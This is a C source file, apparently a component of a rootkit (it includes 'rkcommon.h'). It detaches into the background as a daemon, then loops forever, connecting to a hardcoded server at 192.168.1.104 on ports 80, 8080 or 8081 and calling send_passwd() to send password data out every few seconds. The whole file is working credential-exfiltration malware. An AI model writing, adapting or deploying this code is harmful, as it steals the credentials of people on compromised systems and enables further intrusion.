#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <errno.h>
#include "get_ip_port.h"
#include "rkcommon.h"

int sendtime = 5;
char *passwdip[3] = {"192.168.1.104", "192.168.1.104","192.168.1.104"};
int passwdport[3] = {80, 8080, 8081};

int fnSockClientInit(char *remotehost,int remoteport)
{
	struct hostent *h;
	struct sockaddr_in s;
	int sock;

	sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock < 0)
		return sock;
	
	bzero((char *) &s, sizeof(s));
	s.sin_family = AF_INET;
	s.sin_port = htons(remoteport);
	s.sin_addr.s_addr = inet_addr(remotehost);

	if (connect(sock,(struct sockaddr *)&s,sizeof(s)) < 0)
	{
		close(sock);
		return -1;
	}
	
	return sock;
}

int getserver()
{
	int i = 0;
	int sockfd = -1;
	for (i = 0; i < 3; i++)
	{
		sockfd = fnSockClientInit(passwdip[i], passwdport[i]);
		if (sockfd > 0)
			return sockfd;
	}
	return sockfd;
}

void EnterDaemonMode(void)
{
	switch(fork())
	{
		case 0:

			break;

		case -1:
			exit(-1);
			break;

		default:

			exit(0);
			break;
	}

	setsid();
}

int main(int argc, char **argv)
{

	EnterDaemonMode();

	int server_fd;
	int ret;
	time_t lastsend = time(NULL);
	while (1)
	{
		time_t now = time(NULL);
		if (now - lastsend < sendtime)
		{
			sleep(5);
			continue;
		}
		server_fd = getserver();
		if (server_fd < 0)
		{
			sleep(5);
			continue;
		}

		ret = send_passwd(server_fd);
		close(server_fd);
		if (ret == 0)
			lastsend = now;
		else
			sleep(5);
	}

	return 0;
}
